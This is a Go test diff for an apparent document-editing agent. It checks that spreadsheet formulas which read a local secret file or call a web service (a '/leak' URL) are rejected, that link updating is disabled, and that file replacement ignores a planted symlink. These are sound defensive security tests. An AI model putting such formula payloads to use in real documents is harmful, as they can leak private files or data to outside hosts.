@@ -235,6 +235,38 @@ func TestLiveOffice(t *testing.T) {
 		t.Fatalf("from read: %v", sheets)
 	}
 
+	// A formula can't read another file or reach the network (PR #547 review C1).
+	secret := filepath.Join(home, "secret.ods")
+	if out := tl.docEdit(ctx, "~/Documents/secret.ods", true, "", []any{map[string]any{"op": "set", "cell": "A1", "value": "hunter2"}}); out["success"] != true {
+		t.Fatalf("secret: %v", out)
+	}
+	if err := os.Rename(filepath.Join(home, "Documents", "secret.ods"), secret); err != nil {
+		t.Fatal(err)
+	}
+	for _, f := range []string{"='" + "file://" + secret + "'#$Sheet1.A1", `=WEBSERVICE("http://127.0.0.1:9/leak")`} {
+		out = tl.docEdit(ctx, "~/Documents/leak.ods", true, "", []any{map[string]any{"op": "set", "cell": "A1", "value": f}})
+		if out["success"] != false || out["error_code"] != "invalid_argument" {
+			t.Fatalf("%s: %v", f, out)
+		}
+		if _, err := os.Stat(filepath.Join(home, "Documents", "leak.ods")); !errors.Is(err, os.ErrNotExist) {
+			t.Fatalf("%s: the file was written", f)
+		}
+	}
+
+	// Defence in depth: the private profile never updates links (Calc's never is 1, Writer's 2).
+	reg, err := os.ReadFile(filepath.Join(home, ".cache", "jarvis-agent", "office-profile", "user", "registrymodifications.xcu"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, want := range []string{
+		`<item oor:path="/org.openoffice.Office.Calc/Content/Update"><prop oor:name="Link" oor:op="fuse"><value>1</value>`,
+		`<item oor:path="/org.openoffice.Office.Writer/Content/Update"><prop oor:name="Link" oor:op="fuse"><value>2</value>`,
+	} {
+		if !strings.Contains(string(reg), want) {
+			t.Errorf("profile lacks %s", want)
+		}
+	}
+
 	// A failed edit leaves the file as it was.
 	before, _ := os.ReadFile(filepath.Join(home, "Documents", "apollo.odt"))
 	out = tl.docEdit(ctx, "~/Documents/apollo.odt", false, "", []any{map[string]any{"op": "replace", "find": "Saturn", "text": "x"}})
@@ -246,5 +278,32 @@ func TestLiveOffice(t *testing.T) {
 	}
 	if _, err := os.Stat(filepath.Join(home, "Documents", ".~lock.apollo.odt#")); !errors.Is(err, os.ErrNotExist) {
 		t.Fatalf("LibreOffice left a lock beside the file: %v", err)
+	}
+}
+
+// replaceFile never writes through a symlink planted beside the file (PR #547 review O3), and
+// leaves no temporary file.
+func TestReplaceFileIgnoresPlantedSymlink(t *testing.T) {
+	dir := t.TempDir()
+	victim, src, dst := filepath.Join(dir, "victim"), filepath.Join(dir, "src"), filepath.Join(dir, "doc.ods")
+	for p, b := range map[string]string{victim: "keep", src: "new", dst: "old"} {
+		if err := os.WriteFile(p, []byte(b), 0o600); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := os.Symlink(victim, filepath.Join(dir, ".jarvis-doc.ods.tmp")); err != nil {
+		t.Skip(err) // no symlinks here (Windows without the privilege)
+	}
+	if err := replaceFile(src, dst, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	if b, _ := os.ReadFile(victim); string(b) != "keep" {
+		t.Fatalf("the symlink's target was written: %q", b)
+	}
+	if b, _ := os.ReadFile(dst); string(b) != "new" {
+		t.Fatalf("dst %q", b)
+	}
+	if left, _ := filepath.Glob(filepath.Join(dir, ".jarvis-*.tmp")); len(left) != 1 { // only the planted link
+		t.Fatalf("temporary files left: %v", left)
 	}
 }
